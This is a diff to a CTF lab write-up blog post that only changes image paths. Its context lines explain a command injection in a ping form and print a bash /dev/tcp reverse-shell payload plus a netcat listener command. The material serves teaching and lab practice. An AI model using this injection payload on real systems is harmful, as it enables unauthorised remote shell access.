@@ -107,11 +107,11 @@ This seems like a custom, lazy-made login function. Normally I wouldn't try and 
 
 From enough completed challenges and CTFs I immediately recognized a possible code injection vulnerability. Let me explain. Our current webapp prompts us to enter a machine to ping. If you think about what's happening inside our target, a command like this is parsed: `ping Entered_IP`. Seems harmless, right? Well, no it is not! A character like "semicolon" (;) or "OR" can be used to append a terminator to the preset ping command which changes a query from `ping ENTERED_IP` to  `ping ENTERED_IP; malicious input`. This effectively allows for code execution which makes us able to enter any command we like into our designated machine. 
 
-<img src="img/blog/IMG_1799.JPG">
+<img src="/img/blog/IMG_1799.JPG">
 
 An attempt to estabilish a reverse shell with netcat was made, but as it appears, our target doesn't  have it. Luckily, there was another trick up my sleeve - `; bash -i >& /dev/tcp/192.168.0.213/4444 0>&1`. This is just another way of telling a computer to connect back to you. Of course before doing this we need to ready our netcat listener. `nc -lvp 4444`
 
-<img src="img/blog/IMG_1800.JPG">		
+<img src="/img/blog/IMG_1800.JPG">		
 			 
 `lvp - listen, verbose, port`
 
@@ -167,4 +167,3 @@ A solid box with a lot of hidden knowledge for new people entering infosec commu
 Have any suggestions or feedback? Write it down below in the comments or send me a message on twitter!
 
 ~V3
-
